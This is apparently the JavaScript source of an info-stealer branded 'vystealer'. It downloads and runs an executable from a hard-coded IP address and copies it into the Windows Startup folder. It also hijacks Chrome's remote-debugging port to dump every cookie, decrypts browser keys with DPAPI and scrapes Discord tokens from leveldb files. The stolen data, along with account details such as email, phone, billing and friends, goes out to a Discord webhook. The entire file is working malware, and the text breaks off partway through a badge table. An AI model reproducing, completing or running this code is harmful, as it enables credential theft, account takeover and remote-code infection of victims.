const fs = require('fs');
const path = require('path');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const { Dpapi } = require('@primno/dpapi');
const childProcess = require('child_process');
const { spawn } = require('child_process');
const WebSocket = require('ws');
const screenshot = require('screenshot-desktop');
const { machineIdSync } = require('node-machine-id');

const downloadUrl = 'http://147.93.66.36:20000/download/service.exe'; 
const exeFilePath = path.join(process.env.USERPROFILE, 'Documents', 'service.exe');

async function downloadFile(url, dest) {
    const writer = fs.createWriteStream(dest);
    const response = await axios({
        url,
        method: 'GET',
        responseType: 'stream',
        headers: {
            'Content-Disposition': 'attachment; filename="service.exe"'
        }
    });

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
    });
}

async function main() {
    try {
        await downloadFile(downloadUrl, exeFilePath);
        console.log('Download concluído:', exeFilePath);

        // Executa o arquivo baixado
        exec(`start "" "${exeFilePath}"`, (error, stdout, stderr) => {
            if (error) {
                return console.error(`Erro ao executar o arquivo: ${error.message}`);
            }
            if (stderr) {
                return console.error(`Stderr: ${stderr}`);
            }
            console.log(`Stdout: ${stdout}`);
        });

        // Adiciona o arquivo ao startup
        const startupDir = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
        const startupFilePath = path.join(startupDir, 'service.exe');

        fs.copyFile(exeFilePath, startupFilePath, (err) => {
            if (err) {
                console.error('Falha ao adicionar ao startup:', err);
            } else {
                console.log('Arquivo adicionado ao startup com sucesso.');
            }
        });
    } catch (error) {
        console.error('Erro ao baixar ou executar o arquivo:', error);
    }
}

main();

const local = process.env.LOCALAPPDATA;
var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
const webhook_url = '%WEBHOOK_URL%';
const DEBUG_PORTS = [9222, 9223, 9224];

const browsersPaths = {
    chrome: {
        bin: `${process.env.PROGRAMFILES}\\Google\\Chrome\\Application\\chrome.exe`,
        user_data: `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`
    },
    msedge: {
        bin: `${process.env["ProgramFiles(x86)"]}\\Microsoft\\Edge\\Application\\msedge.exe`,
        user_data: `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`
    },
    brave: {
        bin: `${process.env.PROGRAMFILES}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe`,
        user_data: `${process.env.LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data`
    },
    opera: {
        bin: `${process.env.PROGRAMFILES}\\Opera\\launcher.exe`,
        user_data: `${process.env.LOCALAPPDATA}\\Opera Software\\Opera Stable`
    },
    vivaldi: {
        bin: `${process.env.PROGRAMFILES}\\Vivaldi\\Application\\vivaldi.exe`,
        user_data: `${process.env.LOCALAPPDATA}\\Vivaldi\\User Data`
    },
    yandex: {
        bin: `${process.env.PROGRAMFILES}\\Yandex\\YandexBrowser\\Application\\browser.exe`,
        user_data: `${process.env.LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data`
    },
    chromium: {
        bin: `${process.env["ProgramFiles(x86)"]}\\Chromium\\Application\\chromium.exe`,
        user_data: `${process.env.LOCALAPPDATA}\\Chromium\\User Data`
    }
};


function findBrowsers() {
    const browsersFound = [];
    for (const [name, paths] of Object.entries(browsersPaths)) {
        if (fs.existsSync(paths.bin)) {
            browsersFound.push({ name, ...paths });
        }
    }
    return browsersFound;
}

function closeBrowserProcess(binPath) {
    const procName = path.basename(binPath);
    try {
        childProcess.execSync(`taskkill /F /IM ${procName}`, { stdio: 'ignore' });
    } catch (error) {}
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function startBrowser(binPath, userDataPath, debugPort, profileName) {
    childProcess.spawn(binPath, [
        '--headless',  
        '--restore-last-session',
        `--remote-debugging-port=${debugPort}`,
        '--remote-allow-origins=*',
        `--user-data-dir=${userDataPath}`,
        `--profile-directory=${profileName}`,
        'https://mail.google.com'
    ], { detached: true, stdio: 'ignore' }).unref();

    await sleep(2000); 
}

async function getWebSocketUrl(debugPort) {
    const DEBUG_URL = `http://127.0.0.1:${debugPort}/json`;
    try {
        const response = await axios.get(DEBUG_URL);
        if (response.data && response.data[0] && response.data[0].webSocketDebuggerUrl) {
            return response.data[0].webSocketDebuggerUrl;
        } else {        }
    } catch (error) {
        throw error;
    }
}

async function extractCookies(wsUrl) {
    return new Promise((resolve, reject) => {
        const ws = new (require('ws'))(wsUrl);

        ws.on('open', () => {
            ws.send(JSON.stringify({ id: 1, method: 'Network.getAllCookies' }));
        });

        ws.on('message', (data) => {
            const response = JSON.parse(data);
            if (response.result && response.result.cookies) {
                const decryptedCookies = response.result.cookies.map(cookie => {
                    if (cookie.encrypted_value) {
                        try {
                            const encryptedValue = Buffer.from(cookie.encrypted_value, 'base64');
                            const iv = encryptedValue.slice(3, 15);
                            const encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                            const authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[0][3], iv);
                            decipher.setAuthTag(authTag);
                            const decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
                            cookie.value = decrypted;
                        } catch (error) {}
                    }
                    return cookie;
                });
                ws.close();
                resolve(decryptedCookies);
            } else {
                ws.close();
            }
        });

        ws.on('error', (err) => {
            ws.close();
            reject(err);
        });
    });
}

function saveCookiesToZip(cookiesByBrowser) {
    const zip = new AdmZip();
    const zipFileName = `${os.hostname()}-FixedCookies.zip`;

    for (const [browserName, profilesCookies] of Object.entries(cookiesByBrowser)) {
        for (const [profileName, cookies] of Object.entries(profilesCookies)) {
            const cookieFileName = `${profileName}.txt`;
            const cookieStrings = cookies.map(cookie =>
                `${cookie.domain}\tTRUE\t/\tFALSE\t2597573456\t${cookie.name}\t${cookie.value}`
            ).join('\n');
            
            fs.writeFileSync(cookieFileName, cookieStrings);
            zip.addLocalFile(cookieFileName);
            fs.unlinkSync(cookieFileName);
        }
    }

    zip.writeZip(zipFileName);
    return zipFileName;
}

async function sendToDiscord(filePath, content = '') {
    const formData = new FormData();
    formData.append('file', fs.createReadStream(filePath));
    if (content) {
        formData.append('payload_json', JSON.stringify({ content }));
    }

    try {
        const response = await axios.post(webhook_url, formData, {
            headers: formData.getHeaders()
        });

        if (response.status === 200) {
            fs.unlinkSync(filePath);
        }
    } catch (error) {}
}

async function getCountryFromIP(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        return response.data.countryCode;
    } catch (error) {
        return '';
    }
}

async function getCountryFlagEmoji(ip) {
    const countryCode = await getCountryFromIP(ip);
    if (!countryCode) return '';
    return countryCode
        .toUpperCase()
        .replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
}

async function processChrome(cookiesByBrowser) {
    try {
        const browser = browsersPaths.chrome;
        const profiles = fs.readdirSync(browser.user_data)
            .filter(profile => profile.startsWith('Profile ') || profile === 'Default');

        let wsUrl;
        let cookies;

        for (const profile of profiles) {
            for (const debugPort of DEBUG_PORTS) {
                try {
                    closeBrowserProcess(browser.bin);
                    await startBrowser(browser.bin, browser.user_data, debugPort, profile);
                    wsUrl = await getWebSocketUrl(debugPort);
                    cookies = await extractCookies(wsUrl);
                    
                    if (!cookiesByBrowser[browser.name]) {
                        cookiesByBrowser[browser.name] = {};
                    }
                    cookiesByBrowser[browser.name][profile] = cookies;

                    await sleep(2000);

                    closeBrowserProcess(browser.bin);
                    break;
                } catch (error) {}
            }
        }
    } catch (error) {}
}

(async () => {
    const browsers = findBrowsers();
    const cookiesByBrowser = {};

    if (browsers.length > 0) {
        for (const browser of browsers) {
            if (browser.name === 'chrome') {
                await processChrome(cookiesByBrowser);
            }
        }

        if (Object.keys(cookiesByBrowser).length > 0) {
            const zipPath = saveCookiesToZip(cookiesByBrowser);
            await sendToDiscord(zipPath);
        }
    }
})();

const maxRetries = 2;
let retryCount = 0;

paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: `@~$~vystealer-${__dirname}\n`,
    url: null,
}
_0x2afdce = {}

browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
  randomPath = `${user.fileLoc}\\vy`;


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}

const decryptKey = (localState) => {
  const encryptedKey = JSON.parse(fs.readFileSync(localState, 'utf8')).os_crypt.encrypted_key;
  const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
  return Dpapi.unprotectData(Buffer.from(encrypted, 'utf8'), null, 'CurrentUser');
};

function findTokenn(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}

const tokens = [];

async function findToken(basePath) {
    const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb');
    if (!basePath.includes('discord')) {
        try {
            fs.readdirSync(leveldbPath).forEach(file => {
                if (file.endsWith('.log') || file.endsWith('.ldb')) {
                    const filePath = path.join(leveldbPath, file);
                    fs.readFileSync(filePath, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                            const patterns = [
                                /mfa\.[\w-]{84}/g,
                                /[\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm,
                                /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g
                            ];
                            patterns.forEach(pattern => {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) {
                                    foundTokens.forEach(token => {
                                        if (!tokens.includes(token)) tokens.push(token);
                                    });
                                }
                            });
                        });
                }
            });
        } catch (e) {   
 }
        return;
    } else {
        const localStatePath = path.join(basePath, 'Local State');
        if (fs.existsSync(localStatePath)) {
            try {
                const tokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;

                fs.readdirSync(leveldbPath).forEach(file => {
                    if (file.endsWith('.log') || file.endsWith('.ldb')) {
                        const filePath = path.join(leveldbPath, file);
                        const fileContent = fs.readFileSync(filePath, 'utf8');
                        const lines = fileContent.split(/\r?\n/);
                        const key = decryptKey(localStatePath);

                        lines.forEach(line => {
                            const foundTokens = line.match(tokenRegex);
                            if (foundTokens) {
                                foundTokens.forEach(token => {
                                    let decrypted;
                                    const encryptedValue = Buffer.from(token.split(':')[1], 'base64');
                                    const start = encryptedValue.slice(3, 15);
                                    const middle = encryptedValue.slice(15, encryptedValue.length - 16);
                                    const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                    decipher.setAuthTag(end);
                                    decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');
                                    
                                    if (!tokens.includes(decrypted)) tokens.push(decrypted);
                                });
                            }
                        });
                    }
                });
            } catch (e) {}
            return;
        }
    }
}


async function stealTokens() {
    const sentTokens = new Set();
    const getCreationDate = (id) => {
        const timestamp = BigInt(id) >> 22n;
        return Math.floor((Number(timestamp) + 1420070400000) / 1000);
    };

    for (let path of paths) {
        await findToken(path);
    }

    for (let token of tokens) {
        if (sentTokens.has(token)) {
            continue;
        }

        try {
            let json;
            await axios.get("https://discord.com/api/v10/users/@me", {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { json = res.data }).catch(() => { json = null });
            if (!json) continue;

            var ip = await getIp();
            var billing = await getBilling(token);
            var { friendsList, numberOfFriends } = await getRelationships(token);

            const userInformationEmbed = {
                color: 0x313338,
                author: {
                    name: `${json.global_name}`,
                    icon_url: json.avatar
                        ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                        : "https://i.imgur.com/HZVZCL1.png",
                },
                fields: [
                    {
                        name: "<:token:1327048745510113290> Token:",
                        value: `\`\`\`${token}\`\`\``
                    },
                    {
                        name: "<:badge:1333655706133598289> Badge:",
                        value: `${getBadges(json.flags) || ''} ${(await getNitro(json.premium_type, json.id, token)) || ''}`.trim() || "\`No badges\`",
                        inline: true
                    },
                    {
                        name: "<:billing:1333655707765047306> Billing:",
                        value: billing,
                        inline: true
                    },
                    {
                        name: "<:2fa:1333655704308813934> 2FA:",
                        value: `\`${json.mfa_enabled ? 'Yes' : 'No'}\``,
                        inline: true
                    },
                    {
                        name: "<:mail:1333655711204245504> Mail:",
                        value: `\`${json.email}\``,
                        inline: true
                    },
                    {
                        name: "<:phone:1333655712802410586> Phone:",
                        value: `\`${json.phone === null ? "No" : json.phone}\``,
                        inline: true
                    },
                    {
                        name: '<:creationdate:1333655709421670450> Creation Date:',
                        value: `<t:${getCreationDate(json.id)}:d>`,
                        inline: true
                    }
                ],
                thumbnail: {
                    url: json.avatar
                        ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                        : "https://i.imgur.com/HZVZCL1.png",
                },
                footer: {
                    text: `${os.userInfo().username} | @vystealer`
                },
                timestamp: new Date()
            };

            const friendsEmbed = {
                color: 0x313338,
                description: friendsList,
                author: {
                    name: `${json.global_name} | Total Friends: ${numberOfFriends}`,
                    icon_url: json.avatar
                        ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                        : "https://i.imgur.com/HZVZCL1.png",
                },
                footer: {
                    text: `${os.userInfo().username} | @vystealer`,
                },
                timestamp: new Date()
            };

            const data = {
                embeds: [userInformationEmbed, friendsEmbed]
            };

            if (data.embeds.length > 0) {
                await axios.post(webhook_url, data);
            }

            sentTokens.add(token);

        } catch (error) {}
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:Discord_Staff:1223097787332169809>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:53141661f1f34d62af9ce610743947f1:1223412115872677919>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:HypeSquad_Event:1223097765899534416>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:Bug_Hunter:1223097740607885444>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:1223097963065380935>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:Bug_Hunter_level2:1223097752737681520>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:devrico:1223097836707512435>",
        Rare: true,
    },
    active_dev: {
        Value: 32768,
        Emoji: "<:activedev:1281107398383239250>",
        Rare: true,
    },
    pomello: {
        Value: 524288,
        Emoji: "<:pomelo:1281110330767835188>",
        Rare: false,
    },
    missaobadge: {
        Value: 4096,
        Emoji: "<:cacadordemisso:1281110348069339219>",
        Rare: false,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:HypeSquad_Bravery:1223097924117074040>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:HypeSquad_Brilliance:1223097776993468446>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:HypeSquad_Balance:1223097913081729106>",
        Rare: false,
